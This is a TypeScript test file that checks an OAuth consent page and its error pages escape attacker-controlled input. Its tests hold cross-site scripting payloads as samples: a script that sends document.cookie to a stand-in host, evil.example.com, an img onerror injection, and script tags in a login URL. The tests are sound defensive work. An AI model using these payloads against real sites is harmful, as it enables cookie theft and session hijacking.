import { describe, expect, it } from "vitest";
import { renderConsentPage, renderErrorPage, renderLoginRequiredPage, escapeHtml } from "../authorize-page";

describe("escapeHtml", () => {
  it("escapes every HTML-significant character", () => {
    expect(escapeHtml(`<script>alert('x')</script>&"`)).toBe(
      "&lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;&amp;&quot;"
    );
  });
});

describe("renderConsentPage — client_name is attacker-controlled, per oauth.ts's own header", () => {
  it("a malicious client_name cannot break out into a real tag", () => {
    const html = renderConsentPage({
      clientName: `<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>`,
      clientId: "lifeos_client_abc",
      redirectUri: "https://evil.example.com/callback",
      scopes: ["read", "write"],
      hiddenFields: { client_id: "lifeos_client_abc" },
      formAction: "/api/mcp/oauth/authorize",
    });
    expect(html).not.toContain("<script>fetch");
    expect(html).toContain("&lt;script&gt;");
  });

  it("shows the real redirect host so a mismatched app is visible before clicking Allow", () => {
    const html = renderConsentPage({
      clientName: "Claude",
      clientId: "lifeos_client_abc",
      redirectUri: "https://claude.ai/api/mcp/auth_callback",
      scopes: ["read", "write"],
      hiddenFields: {},
      formAction: "/api/mcp/oauth/authorize",
    });
    expect(html).toContain("claude.ai");
    expect(html).toContain("Claude");
  });

  it("falls back to a neutral label when the client registered no name", () => {
    const html = renderConsentPage({
      clientName: null,
      clientId: "lifeos_client_abc",
      redirectUri: "https://a.example.com/cb",
      scopes: ["read"],
      hiddenFields: {},
      formAction: "/api/mcp/oauth/authorize",
    });
    expect(html).toContain("Unnamed app");
  });

  it("re-emits every hidden field, escaped, so the POST can re-validate from scratch", () => {
    const html = renderConsentPage({
      clientName: "Claude",
      clientId: "lifeos_client_abc",
      redirectUri: "https://a.example.com/cb",
      scopes: ["read"],
      hiddenFields: { state: `"><img src=x onerror=alert(1)>`, code_challenge: "abc123" },
      formAction: "/api/mcp/oauth/authorize",
    });
    expect(html).not.toContain("<img src=x");
    expect(html).toContain('name="code_challenge" value="abc123"');
  });
});

describe("renderErrorPage / renderLoginRequiredPage", () => {
  it("escapes the error message", () => {
    expect(renderErrorPage(`<b>oops</b>`)).not.toContain("<b>oops</b>");
  });

  it("escapes the login URL", () => {
    expect(renderLoginRequiredPage(`/login?next="><script>1</script>`)).not.toContain("<script>1</script>");
  });
});
